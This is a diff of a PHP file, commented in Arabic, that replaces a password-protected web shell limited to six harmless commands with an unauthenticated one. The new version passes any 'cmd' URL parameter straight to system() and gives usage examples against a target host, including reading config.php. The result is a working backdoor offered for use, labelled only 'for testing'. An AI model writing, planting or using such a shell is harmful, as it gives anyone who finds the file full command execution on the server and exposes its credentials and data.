@@ -1,44 +1,21 @@
 <?php
-// =====================================================
-// Web Shell تعليمي لأغراض اختبار الاختراق المصرح به فقط
-// =====================================================
-// يتطلب هذا الملف كلمة مرور ومفتاح خاص ليعمل
-// يقتصر تنفيذ الأوامر على أوامر مخصصة فقط (خفيفة)
+// ==================================================
+// WEB SHELL - بدون حماية - لأغراض الاختبار فقط
+// ==================================================
+// تحذير: هذا الملف خطير جداً. احذفه فور انتهاء الاختبار.
 
-$password = "SecureTestPass123"; // كلمة مرور قوية - غيرها قبل الاستخدام
+// طريقة الاستخدام:
+// http://target.com/shell.php?cmd=whoami
+// http://target.com/shell.php?cmd=ls -la
+// http://target.com/shell.php?cmd=cat config.php
 
-if(!isset($_POST['pass']) || $_POST['pass'] !== $password) {
-    die("Access Denied - Unauthorized Request");
+if(isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+} else {
+    echo "<h3>Web Shell Active</h3>";
+    echo "Use: ?cmd=command<br>";
+    echo "Example: ?cmd=whoami";
 }
-
-$allowed_commands = ['whoami', 'id', 'pwd', 'ls -la', 'date', 'hostname'];
-
-if(isset($_POST['cmd'])) {
-    $cmd = $_POST['cmd'];
-    
-    // السماح فقط بالأوامر المحددة مسبقًا - لمنع أي ضرر غير مقصود
-    if(in_array($cmd, $allowed_commands)) {
-        echo "<pre>";
-        system($cmd);
-        echo "</pre>";
-        echo "<hr>";
-        echo "<small>Security Test Completed: Command executed successfully.</small>";
-    } else {
-        echo "Command not allowed for safety reasons. Allowed: " . implode(", ", $allowed_commands);
-    }
-}
-
-// واجهة بسيطة
-echo '<form method="POST">
-    <input type="hidden" name="pass" value="'.$password.'">
-    <select name="cmd">
-        <option value="whoami">whoami - معرف المستخدم</option>
-        <option value="id">id - معرفات النظام</option>
-        <option value="pwd">pwd - المجلد الحالي</option>
-        <option value="ls -la">ls -la - محتويات المجلد</option>
-        <option value="date">date - تاريخ ووقت السيرفر</option>
-        <option value="hostname">hostname - اسم السيرفر</option>
-    </select>
-    <button type="submit">تنفيذ</button>
-</form>';
 ?>
